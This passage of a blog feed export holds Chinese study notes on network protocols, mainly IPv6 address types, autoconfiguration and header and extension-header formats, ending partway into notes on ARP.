title="PMTU的改变"></a>PMTU的改变</h5><ul><li>由于路由拓扑结构的变化，源节点和目标节点之间的路径会随着时间而改变。·路径MTU的减小，可以通过接收到的ICMPv6包过大报文被立即发现。而路径MTU的增大，则必须通过发送方的检测才能发现。根据RFC1981，发送方可以通过试图发送更长的数据包来进行检测。而这种检测应该在距离接收到ICMPv6包过大报文最少5分钟(建议取10分钟)之后进行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6协议结构</title>
      <link href="/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="网络协议分析-IPv6协议部分"><a href="#网络协议分析-IPv6协议部分" class="headerlink" title="网络协议分析    IPv6协议部分"></a>网络协议分析    IPv6协议部分</h2><p>[TOC]</p><h3 id="网络协议分析之IPv6协议基础"><a href="#网络协议分析之IPv6协议基础" class="headerlink" title="网络协议分析之IPv6协议基础"></a>网络协议分析之IPv6协议基础</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握IPv6协议栈的常用命令</span><span class="token comment">#掌握lPv6单播地址的使用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="IPv6的特征："><a href="#IPv6的特征：" class="headerlink" title="IPv6的特征："></a>IPv6的特征：</h4><h4 id="IPv6地址："><a href="#IPv6地址：" class="headerlink" title="IPv6地址："></a>IPv6地址：</h4><h5 id="IPv6地址空间："><a href="#IPv6地址空间：" class="headerlink" title="IPv6地址空间："></a>IPv6地址空间：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6地址空间分配情况.png" style="zoom:67%;" /><center>IPv6地址空间分配情况</center><blockquote><p style="color:blue;">IPv6地址有三种表示形式：首选地址，压缩格式和内嵌IPv4的IPv6地址格式</p></blockquote><p><strong>首选格式</strong>：</p><blockquote><p>128位地址用16位边界分成8组，每个组转换成4位十六进制数用冒号分隔，称为冒号十六进制</p></blockquote><p><strong>压缩格式</strong>：</p><blockquote><p style="color:blue;">零压缩:连续为0的组可以压缩为::(双冒号)</p></blockquote><p>删除每组的前导0， 把连续的一段0压缩为:: ，在一个IPv6地址中::只能出现一次 </p><blockquote><p style="color:blue;">零压缩只能在给定地址中使用一次，不能使用零压缩来包括某个组的一部分</p></blockquote><p><strong>IPv4的IPv6地址格式：</strong></p><blockquote><p style="color:black;">在IPv4和IPv6的混合环境中，IPv6地址中的最低32位可以用于表示lPv4地址，即:X:X:X:X:X:d.d.d.d，其中X表示16进制整数，而d表示十进制整数</p></blockquote><h5 id="IPv6格式前缀-FP-Format-Prefix"><a href="#IPv6格式前缀-FP-Format-Prefix" class="headerlink" title="IPv6格式前缀(FP, Format Prefix)"></a>IPv6格式前缀(FP, Format Prefix)</h5><ul><li>类似于IPv4中的CIDR表示法，IPv6地址被分成两个部分：子网前缀和接口标识符</li><li>IPv6地址前缀格式为:IPv6地址/前缀长度<ul><li>1030:0:0:0:C9B4:FF12:48AA:1A2B/60，用于路由的前缀长度为60位。</li><li>前缀是地址的一部分，这部分或者有固定的值，或者是路由或子网的标识。64位前缀用来表示节点所在的单个子网，所有子网都有相应的64位前缀。任何少于64位的前缀,或者是一个路由前缀，或者是包含了部分IPv6地址空间的一个地址范围</li></ul></li></ul><h4 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6地址结构.png" style="zoom:67%;" /><ul><li>全球路由前缀:识别分配给一个站点的某个特殊地址或地址范围</li><li>子网ID:用于识别站点中的某个链路，一个子网ID与一个链路相关联，也可以将多个子网ID分配给一个链路</li><li>接口ID:用于识别和指明链路上的一个接口，并且接口ID在该链路上必须是唯一的</li></ul><p><strong>接口标识的生成</strong>：由IEEE EUI - 64规范自动生成，设备随机生成，或手工配置。</p><p><strong>EUI - 64规范(Extended Unique ldentifier)</strong></p><ul><li>将48比特的MAC地址转化为64比特的接口标识，因此理论上可多达264个不同的物理接口</li><li>转换方法:在MAC地址的中间插入4位16进制数FFFE，再把从最高位开始的第7位U/L位取反（置1)</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/EUI-64规范.png" style="zoom:67%;" /><h5 id="IPv6地址的分配"><a href="#IPv6地址的分配" class="headerlink" title="IPv6地址的分配"></a>IPv6地址的分配</h5><p><strong>IPv6地址是分配给接口的，在IPv6网络中一个接口可以有一个或多个IPv6地址(单播地址、任播地址和多播地址)</strong></p><blockquote><p style="color:blue;">一个节点的每个接口都需要至少一个单播地址。同时，一个单播地址只能与一个网络接口相关联</p></blockquote><h5 id="IPv6地址类别"><a href="#IPv6地址类别" class="headerlink" title="IPv6地址类别"></a>IPv6地址类别</h5><p>**单播地址(Unicast Address)**：用来标识单一网络接口。送往一个单播地址的包将被传送至该地址标识的接口上。</p><p>**组播地址(Multicast Address)**：用来标识一组网络接口(通常属于不同的节点)。送往一个组播地址的包将被传送至有该地址标识的所有接口上。<br>**任播（泛播）地址(Anycast Address)**：用来标识一组网络接口。送往泛播地址的包将被传送至该地址标识的接口之一(路由距离“最近”的接口)。它是IPv6引入的新的地址类型。</p><h4 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h4><blockquote><p style="color:orange;">单播地址包括全球单播地址、链路本地地址、站点本地地址、特殊地址、兼容地址、NSAP地址</p></blockquote><h5 id="可聚类全球单播地址"><a href="#可聚类全球单播地址" class="headerlink" title="可聚类全球单播地址"></a>可聚类全球单播地址</h5><p>相当于IPv4公共地址，有3个部分:</p><ul><li><p>ISP分配的前缀</p></li><li><p>站点拓扑，组织机构使用ISP分配的一个<strong>48位前缀</strong>，可以用前缀的49—64位共16位把网络划分为子网，最多可以划分65535个子网</p></li><li><p>接口ID:低64位用于标识接口</p></li></ul><p><strong>全球单播地址报文格式：</strong></p><ul><li>FP字段:格式前缀，3位，目前值为”001”，标识这是可集聚全球单播地址</li><li>TLAID字段:顶级集聚标识符，13位，包含最高级地址选路信息，即网络互连中最大的选路信息，可得到最大8192个不同的顶级路由</li><li>RES字段:8位，保留。最终可能会用于扩展顶级或下一级集聚标识符字段。</li><li>NLAID字段:下一级集聚标识符，24位，该标识符被一些机构用于控制顶级集聚以安排地址空间，这些机构能按照他们自己的寻址分级结构来将此24位字段切开用</li><li>SLAID字段:站点级集聚标识符，16位，获得48位前缀的组织机构用来安排内部网络结构，若字段全部用作平面地址空间，则最多可有65535个不同子网</li><li>接口标识符字段:64位，IEEE EUI-64接口标识符</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/全球单播地址报文格式.png"  /><h5 id="链路本地地址-Link-local"><a href="#链路本地地址-Link-local" class="headerlink" title="链路本地地址(Link-local)"></a>链路本地地址(Link-local)</h5><blockquote><p style="color:orange;">链路本地地址具有固定的地址格式，由设备自动生成，范围限制在同一本地链路的节点之间，在邻居发现等IPv6机制中或者没有路由器的网络上用到该类型的地址</p></blockquote><ul><li><p>链路本地地址的组成包括一个特定的前缀<strong>FE80::/64</strong>和低64位的EUI-64接口ID</p></li><li><p>节点启动IPv6协议栈时，节点的每个接口会自动分配一个链路本地地址，这种机制的特点是连接在同一链路上的两个IPv6节点不需要做任何配置就可以通信</p></li><li><p>路由器在源端和目的端对具有链路本地地址的包不予处理，因为永远也不会转发这些包</p></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/链路本地地址.png"  /><p>在lPv6中，一个有可聚类全球单播地址的节点在本地链路上，使用默认IPv6路由器的链路本地地址，而不使用路由器的可聚类全球单播地址。如果必须发生网络重新编址，即单播可聚类全球前缀更改为一个新的单播可聚类全球前缀时，总能使用链路本地地址到达默认路由器。在网络重新编址过程中，节点和路由器的链路本地地址不会发生变化</p><h5 id="站点本地地址-Site-local"><a href="#站点本地地址-Site-local" class="headerlink" title="站点本地地址(Site-local)"></a>站点本地地址(Site-local)</h5><blockquote><p style="color:red;">站点本地地址也是应用范围受限的地址，类似于IPv4专用地址，可供没有申请到可聚类全球单播地址的组织机构使用</blockquote><ul><li>站点本地地址不是自动生成的</li><li>前48位是固定的，其中前10位是固定的二进制位组合1111111011，后面是38位0(FEC0:/48)，接着是提供单位构建子网的16位的子网ID字段，最后是EUI-64接口ID</li><li>站点本地地址能用在内联网中传送数据，但不允许从站点直接选路到全球Internet。站点内的路由器只能在站点内转发包，而不能把包转发到站点外去。 </li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/站点本地地址.png"  /><h5 id="特殊地址和保留地址"><a href="#特殊地址和保留地址" class="headerlink" title="特殊地址和保留地址"></a>特殊地址和保留地址</h5><ul><li>IPv6地址空间中，第一个1/256的大部分空的地址空间用作特殊地址，包括:<ol><li>未指定地址:全0地址，当没有有效地址时，可采用该地址。作为源地址使用，不能被路由器转发。可以表示为0:0:0:0:0:0:0:0或::</li><li>回返地址:除了最低位外，全为0，即0:0:0:0:0:0:0:1或::1。</li><li>嵌有IPv4地址的IPv6地址:一类允许IPv6节点访问不支持IPv6的IPv4节点（IPv4映象地址)，另一类允许IPv6路由器用隧道方式，在IPv4网络上传送IPv6包(IPv4兼容地址)</li></ol></li><li>NSAP和IPX地址分配<ul><li>lPng的目标之一是要统一整个网络世界，使IP、IPX和OSI网络间能进行互操作。为了支持这种互操作性，IPv6为OSI和IPX各保留了1/128地址空间。IPX地址格式尚未精确定义</li><li>NSAP地址分配的描述见RFC1888 (OSI NSAP和IPv6)</li></ul></li></ul><h4 id="多播地址："><a href="#多播地址：" class="headerlink" title="多播地址："></a>多播地址：</h4><blockquote><p style="color:red;">多播指的是源节点发送的单个数据报可以被指明的多个目的节点收到</p></blockquote><ul><li>IPv6协议中的多播地址用最高8位是11111111(FF)来标识多播地址</li><li>多播地址只能用作目的地址。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/多播地址.png" style="zoom:67%;" /><ul><li><p>标识字段：地址格式中的第1个字节为全<code>&quot;1&quot;</code>(FF)，标识其为多播地址</p></li><li><p>标志字段：占4位。目前只定义了第4位，用<code>&quot;0&quot;</code>表示该地址是由Internet编号机构指定的熟知多播地址，<code>1</code>表示特定场合使用的临时多播地址</p></li><li><p>范围字段:占4位，用来限制多播数据流在网络中发送的范围，见下表</p></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/多播地址范围字段.png" style="zoom:67%;" /><ul><li>组标识符字段:占112位，用于标识多播组，最多可以编码2112个组的ID。</li></ul><h5 id="IPv6具有特别含义的特殊多播地址"><a href="#IPv6具有特别含义的特殊多播地址" class="headerlink" title="IPv6具有特别含义的特殊多播地址"></a>IPv6具有特别含义的特殊多播地址</h5><ul><li>FF01::1表示节点本地范围内所有节点多播地址;</li><li>FF02::1表示链路本地范围内所有节点多播地址;</li><li>FF01:2表示节点本地范围内所有路由器多播地址;</li><li>FF02::2表示链路本地范围内所有路由器多播地址;</li><li>FFO5::2表示站点本地范围内所有路由器多播地址。</li><li>IPv6多播地址中有一种特殊用途的<strong>请求节点(Solicited-node)多播地址</strong>，主要用于重复地址检测(DAD)和获取邻居节点的链路层地址。请求节点多播地址由前缀FFO2::1:FFO0:0/104和单播地址的最后24位组成。</li></ul><p>当节点预订多播地址时，它声明要成为多播的一个成员，于是任何本地路由器将以该节点的名义预订多播地址。同一网络上的其他节点要发送信息到该多播地址时，IP多播包将被封装到链路层多播数据传输单元中，发送给每个订户。从本地网以外来的多播，用同样方法处理，只是传递给路由器，由路由器把包转发给预订节点。</p><blockquote><p style="color:black;">路由器不转发广播包，但对多播而言只要路由器以其它节点的名义预订多播地址，就能有选择地转发多播包</blockquote><h4 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h4><p>任播地址是IPv6协议特有的地址类型</p><blockquote><p style="color:orange;">多个节点共享一个任播地址，但只有一个节点接收给任播地址的数据报。适合于一对一组中的一个(One to One of Many)的通信需求</p></blockquote><blockquote><p style="color:blue;">任播地址用来标识通常属于不同节点的一组网络接口，路由器把目标地址是任播地址的数据报发送给离该路由器"最近"的一个接口</p></blockquote><ul><li>任播地址只能用作IPv6数据报的目的地址，只能分配给IPv6路由器</li><li>任播对某些类型的服务特别有用，尤其是对于C/S之间不需要有特定关系的服务，如DNS、NTP等</li></ul><p>任播地址是从单播地址空间中划分出来的，与单播地址有相同的格式，当一个单播地址属于多个接口时，就是任播地址。因为任播地址在形式上与单播地址无法区分开，一个任播地址的每个成员，必须显式地加以配置，以便识别任播地址</p><p><strong>子网路由器任播地址格式:</strong></p><blockquote><p>子网前缀部分设置为路由器所在子网的前缀，地址的其余位设置为0，发送到这个地址上的数据包会被发送到该子网中的一个路由器上</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/子网路由器任播地址格式.png" style="zoom: 80%;" /><p><strong>预留的任播地址(RFC 2526)</strong></p><ul><li>在每个子网内，接口标识符值0—127是为子网任播地址分配而保留的，0—125和127为保留，126用于移动lPv6家园代理(Mobile lPv6 Home Agents)的任播</li><li>预留的任播地址不能分配给单播地址，它们的结构按是否含EUl-64分为两类</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/预留的任播地址.png" style="zoom:100%;" /><p><strong>节点必须的IPv6地址</strong></p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/节点必须的IPv6地址.png" style="zoom:67%;" /><p><strong>路由器必须的IPv6地址：</strong></p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/路由器必须的IPv6地址.png" style="zoom: 70%;" /><h4 id="IPv6地址配置技术"><a href="#IPv6地址配置技术" class="headerlink" title="IPv6地址配置技术"></a>IPv6地址配置技术</h4><h5 id="路由器地址配置"><a href="#路由器地址配置" class="headerlink" title="路由器地址配置"></a>路由器地址配置</h5><p>与IPv4方法类似，管理员手工为接口配置一个IPv6地址，并指定前缀长度</p><h5 id="主机地址配置"><a href="#主机地址配置" class="headerlink" title="主机地址配置"></a>主机地址配置</h5><ul><li>考虑到主机用途的多样性，采用自动配置方法，常用的自动配置技术包括:有状态自动配置协议(DHCPv6)和无状态自动配置协议。</li></ul><p><strong>手工配置和检测</strong></p><ol><li>建议用于服务器和重要网络设备</li><li>接口地址配置的内容包括:128位IPv6地址和前缀长度</li><li>IPv6地址配置到接口上以后，需要检测所配置的地址在链路上是否<strong>唯一</strong><ul><li>IPv6重复地址检测<strong>DAD</strong>，属于邻居发现(ND，Neighbor Discovery)协议的功能</li></ul></li></ol><p><strong>自动配置</strong></p><ul><li>赋予主机自己的地址参数，包括地址前缀、接口ID</li><li>赋予主机其它的相关参数，包括路由器地址、跳数、MTU…</li></ul><p><strong>自动配置过程</strong></p><ol><li><p>接口初始化，然后产生“tentative”(实验性)地址</p></li><li><p>对“tentative”地址进行重复地址检测(DAD)</p></li><li><p>接口产生link-local地址，具备IP连接能力</p></li><li><p>决定采用何种自动配置技术</p><ul><li>由Router Advertisement报文及主机配置来决定</li><li>无状态自动配置(stateless autoconfiguration)</li><li>有状态自动配置(stateful autoconfiguration)</li></ul></li><li><p>获得全球地址</p></li></ol><h5 id="即插即用"><a href="#即插即用" class="headerlink" title="即插即用"></a>即插即用</h5><ul><li>lPv6用两种不同机制来支持即插即用，即BOOTP和DHCP。这些协议支持“状态自动配置”，即服务器必须管理和保存每个节点的状态信息</li></ul><p><strong>有状态自动配置与无状态自动配置</strong></p><ul><li>有状态自动配置的问题在于:用户必须保持和管理特殊的自动配置服务器以管理所有“状态”</li><li>对于个人或者小型机构，无状态自动配置是较容易的解决方案。这种机制允许个人节点确定自己的IP配置，而不必向服务器显式请求各节点的信息</li></ul><h5 id="同时使用无状态及有状态两种配置方式"><a href="#同时使用无状态及有状态两种配置方式" class="headerlink" title="同时使用无状态及有状态两种配置方式"></a>同时使用无状态及有状态两种配置方式</h5><ul><li>两种类型自动配置方式的合作比单独使用其中一种更易于实现Internet网络连接的即插即用<ul><li>可以使用无状态自动配置生成一个IPv6地址，然后对附加参数使用有状态的自动配置</li></ul></li><li>无状态自动配置要简单的多，为什么还要使用状态自动配置?<ul><li>无状态自动配置对得到IP地址的节点提供最低程序的监视，任一节点可以连接到链路，通过路由器通告来获知网络和子网信息，并构造有效的链路地址</li><li>如果有DHCP服务器的支持，那么机构可以更紧密地控制网络可配置的节点。同时，只有由网络管理员明确授权的节点才能通过DHCP服务器来配置</li></ul></li></ul><h3 id="IPv6协议结构"><a href="#IPv6协议结构" class="headerlink" title="IPv6协议结构"></a>IPv6协议结构</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握IPv6的报头格式#掌握分片报头的格式及用途#理解IPv6数据包的拆分、重组过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="IPv6数据包结构"><a href="#IPv6数据包结构" class="headerlink" title="IPv6数据包结构"></a>IPv6数据包结构</h4><blockquote><p style="color:orange;">由固定首部(base header)和有效载荷(payload)组成：首部长度变为固定的40字节，称为基本首部，所有的扩展首部和上层数据合起来叫做数据报的有效载荷或净负荷</p></blockquote><ul><li>取消不必要的功能，首部的字段数减少到只有8个</li><li>取消了首部检验和字段，加快了路由器处理数据报的速度</li><li>基本首部的后面允许有零个或多个扩展首部。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据结构.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据包结构示意图.png" style="zoom: 50%;" /><center>IPv6数据包结构示意图</center>#### 基本首部<h5 id="基本首部各字段含义："><a href="#基本首部各字段含义：" class="headerlink" title="基本首部各字段含义："></a>基本首部各字段含义：</h5><ul><li>版本:4位，指明了协议的版本，对IPv6该字段总是6。</li><li>区分服务:8位，以前叫做通信流类别，6表示IPv6数据包的类或优先级。类似于IPv4的服务类型字段。</li><li>流标号:20位，流是互联网络上从特定源点到特定终点的一系列数据报。数据流由流标号和源节点的地址唯一标识。所有属于同一个流的数据报都具有同样的流标号、源lP地址和目的IP地址</li><li>有效载荷长度:16位，指明IPv6数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是64KB。如果使用逐跳选项扩展头的特大净荷选项，就能传送更大的数据包，此时有效载荷长度置0</li><li>下一个首部:8位，如果IPv6数据报没有扩展首部，它相当于IPv4的协议字段;如果IPv6数据报有扩展首部，它指出第一个扩展首部的类型</li><li>跳数限制:8位，与IPv4的TTL类似。源节点在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减1。当跳数限制的值为零时，将此数据报丢弃</li><li>源地址:128位，定义了源主机的IP地址</li><li>目的地址:128位，定义了目的主机的IP地址。如果出现路由头，这个地址不是最终的接收数据包的主机的IPv6地址，而是路由报头列表中的第一个路由器地址</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据结构与IPv4的对比.png" style="zoom: 50%;" /><h4 id="IPv6拓展首部："><a href="#IPv6拓展首部：" class="headerlink" title="IPv6拓展首部："></a>IPv6拓展首部：</h4><ul><li>它代替了IPv4报头及其选项，增强了IPv6的功能，使其可以支持未来的需求</li><li>扩展首部留给路径两端的源站和目的站主机来处理，中间路由器都不处理扩展首部（除路由选择和逐跳选项扩展首部)，大大提高了路由器的处理效率</li><li>lPv6数据包中可以包含零个或多个具有不同的长度扩展报头。IPv6报头中的下一个报头字段，指向第一个扩展报头。每个扩展报头中，都包含下一个报头字段，指向下一个扩展报头。最后一个扩展报头指出上层协议数据单元的类型，上层协议可以是TCP协议、UDP协议或者ICMPv6协议等。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/无扩展首部.png" style="zoom:80%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/有扩展首部.png" style="zoom: 67%;" /><h5 id="六种扩展首部："><a href="#六种扩展首部：" class="headerlink" title="六种扩展首部："></a>六种扩展首部：</h5><p><strong>逐跳选项扩展首部</strong>(Hop-by-Hop Options Header)，<strong>路由选择扩展首部</strong>(Routing Header)，<strong>分片扩展首部</strong>(Fragment Header)，<strong>认证扩展首部</strong>(Authentication Header)，<strong>目的站选项扩展首部</strong>(Destination Header)和封装<strong>安全有效载荷扩展首部</strong>(Encapsulated Security Payload Header)</p><blockquote><p style="color:blue;">注:每个扩展首部的长度应为8个字节的整数倍，是为了满足扩展首部对齐的要求</p></blockquote><h5 id="逐跳选项扩展首部"><a href="#逐跳选项扩展首部" class="headerlink" title="逐跳选项扩展首部"></a>逐跳选项扩展首部</h5><ul><li>逐跳选项扩展首部中最实质的是逐跳选项字段的内容，该字段描述了数据分组转发的特性。从源节点到目的节点的路由上的每个节点，即每个转发包(数据报)的路由器都检查逐跳选项中的信息</li><li>由于它需要每个中间路由器进行处理，所以只在绝对必要的时候才会出现</li><li>必须紧跟在IPv6基本首部后，若存在逐跳选择首部，基本首部中下一个首部字段值为0</li></ul><p><strong>逐跳选项：</strong></p><ul><li>巨型净荷选项:净荷超过65535字节</li><li>路由器警告选项:用于多播侦听发现和资源存储协议</li></ul><blockquote><p>RFC2460中已经将这两个选项废弃。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/逐跳扩展首部结构.png"  /><h5 id="路由选择扩展首部"><a href="#路由选择扩展首部" class="headerlink" title="路由选择扩展首部"></a>路由选择扩展首部</h5><p>路由选择扩展首部代替了IPv4中所实现的源选路。源选路允许用户指定数据报的路径，即到达目的地沿途必须经过的路由器<br>·前一个首部中的<code>下一个首部</code>的<strong>字段值为43</strong></p><blockquote><p>RFC2460中定义了一种类型，即类型0，只有列表中的路由器才处理路由选择扩展首部，其它路由器不必处理</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/路由选择扩展首部.png" style="zoom: 80%;" /><p><strong>路由选择扩展操作过程</strong></p><ul><li>源节点构造数据报必须经过的路由器列表，构造类型0选路首部（路由器列表、最终目的地址、剩余段数)</li><li>IPv6基本首部的目的地址是路由器列表中的第一个路由器地址,而不是包的最终目的地址。最终目的地址是路由选择扩展首部数据字段的最后一个地址</li><li>在地址列表中的节点接收到该包之后，对IPv6基本首部和路由选择扩展首部进行处理:<ul><li>剩余段数为0，则此路由器节点是该包的最终目的地址</li><li>若此节点不是该包的最终目的地址，将它自己的地址从IPv6首部目的地址字段取出，用路由选择列表中的下一个节点地址代替，同时将剩余段数字段值减1，并把包发送到下一个节点</li><li>重复此过程，直到包到达其最终目的地址。</li></ul></li></ul><h5 id="分段扩展首部"><a href="#分段扩展首部" class="headerlink" title="分段扩展首部"></a>分段扩展首部</h5><blockquote><p style="color:blue;">当源节点发送的IPv6数据报比到达目的节点所经过路径上的最小MTU(PMTU)还要大时，需要对这个数据报进行分段</p></blockquote><p>IPv6协议通过分段扩展首部实现数据报的分段，只允许源节点对数据报进行分段，简化了中间节点对数据报的处理<br>前一个首部中的<code>下一个首部</code>的<strong>字段值为44</strong>。<br>需要进行分段的原始数据报在源节点被分为一系列分段数据报发送出去，每个分段数据报的大小应与传输路径上的最小MTU适应</p><blockquote><p>RFC2460中规定最小MTU值为1280字节</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/分段扩展首部.png"  /><blockquote><p style="color:blue;">对于IPv6固定首部和传输过程中必须由路由器处理的扩展首部如路由选择、逐跳选项扩展首部，不允许分段</p></blockquote><ul><li><p>可分段的部分包括:<strong>载荷、只能在到达最终目的地址时才处理的扩展首部</strong>。</p></li><li><p>将原始数据报中的可分段部分从左到右分成若干片，除最后一个分段外，每一片的长度是8个的整数倍。</p></li><li><p><strong>每个分段单独封装为一个IPv6数据报。</strong></p></li></ul><h5 id="身份认证扩展首部"><a href="#身份认证扩展首部" class="headerlink" title="身份认证扩展首部"></a>身份认证扩展首部</h5><blockquote><p style="color:orange;">为IPv6数据包和IPv6报头中那些经过IPv6网络传输后值不会改变的字段，提供了数据验证、数据完整性和反重放保护</p></blockquote><p>前一个首部中的<code>下一个首部</code>的<strong>字段值为51</strong></p><h5 id="封装安全有效载荷扩展首部"><a href="#封装安全有效载荷扩展首部" class="headerlink" title="封装安全有效载荷扩展首部"></a>封装安全有效载荷扩展首部</h5><ul><li>封装安全有效载荷（ESP）报头和尾部提供了数据机密性、数据验证性、数据完整性，以及对已封装有效载荷的重放保护服务。ESP报头并不为出现在它之前的IPv6报头或扩展报头提供安全服务</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为50</strong></li></ul><h5 id="目的站选项扩展首部"><a href="#目的站选项扩展首部" class="headerlink" title="目的站选项扩展首部"></a>目的站选项扩展首部</h5><ul><li><strong>目的站选项扩展首部</strong>携带只需要目的站点检验的可选信息，IPv6目的地址字段所列的第一个目的主机，以及路由选择扩展首部所列的后续目的主机都要处理这个可选信息</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为60</strong></li><li>以下两种方式使用目的选项头:<ul><li><strong>如果存在路由报头，则目的选项报头指定了在每个中间目标都要转发或处理的选项，此时目的选项头出现在路由报头之前</strong></li><li><strong>如果不存在路由报头，或者目的选项头出现在路由头之后，则目的选项报头中指定了在最终目标处要转发或处理的洗项</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv4部分协议信息汇总</title>
      <link href="/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
      <url>/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 